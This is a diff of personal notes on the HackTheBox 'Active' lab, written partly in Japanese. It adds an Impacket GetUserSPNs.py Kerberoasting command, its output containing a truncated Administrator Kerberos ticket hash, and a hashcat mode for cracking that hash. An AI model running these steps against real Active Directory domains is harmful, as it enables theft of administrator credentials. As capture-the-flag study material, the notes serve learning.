@@ -15,15 +15,27 @@
 
 ```
 ┌──(kali㉿kali)-[~]
-└─$ GetUserSPNs.py -request -dc-ip <target's IP> <domain>/<user name> -save -outputfile GetUserSPNs.out
+└─$ GetUserSPNs.py -request -dc-ip <target IP> <domain>/<user name> -save -outputfile GetUserSPNs.out
 
 (e.g.) $ GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
 ```
-
-
-c.f.[0xdf hacks stuff](https://0xdf.gitlab.io/2018/12/08/htb-active.html#decrypting-gpp-password)
+  
+(c.f. [0xdf hacks stuff](https://0xdf.gitlab.io/2018/12/08/htb-active.html#decrypting-gpp-password))
 
 > I’ll use the GetUserSPNs.py script from Impacket to get a list of service usernames which are associated with normal user accounts. 
 It will also get a ticket that I can crack. 
-
-
+  
+***GetUserSPNs.pyの結果Administratorのハッシュが取れた！！！***
+  
+```
+┌──(kali㉿kali)-[~]
+└─$ ls
+Administrator.acache
+GetUserSPNs.out
+  
+┌──(kali㉿kali)-[~]
+└─$ cat GetUserSPNs.out
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$25bac967bc8a16...
+```
+  
+注意）このハッシュは（**krb5tgs**）のhashcatでは「-m 13100」。ハッシュタイプ18200はAS_Repのハッシュ。
